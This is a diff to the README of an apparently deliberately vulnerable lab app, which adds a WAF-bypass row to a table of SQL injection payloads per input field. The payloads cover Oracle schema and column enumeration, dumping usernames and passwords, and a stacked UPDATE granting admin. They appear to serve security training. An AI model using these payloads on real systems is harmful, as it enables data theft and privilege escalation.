@@ -55,6 +55,7 @@ App runs on **http://localhost:3001**
 |---|---|---|---|
 | 1 | Search Bar | `Rolex` | Step 1: `' OR '1'='1` · Step 2: `' UNION SELECT ROWNUM, table_name, 0, 'SCHEMA' FROM user_tables --` · Step 3: `' AND 1=0 UNION SELECT ROWNUM, column_name \|\| ' · ' \|\| data_type, 0, 'COLUMNS' FROM user_tab_columns WHERE table_name = 'USERS' --` |
 | 2 | Reference ID Filter | `TRANSFER` | `x' OR user_id<>1 --` |
+| 2b | Reference ID Filter (WAF bypass) | — | XML/hex `REGEXP_LIKE` / `HEXTORAW` — see UI hint line 2 on WAF URL only |
 | 3 | Tax Institution ID | `1` | `0 UNION SELECT TO_CHAR(id), username, password, role FROM users` |
 | 4 | Batch Execution Note | `Q2 rebalance` | `; UPDATE users SET role='admin' WHERE id=1 --` |
 
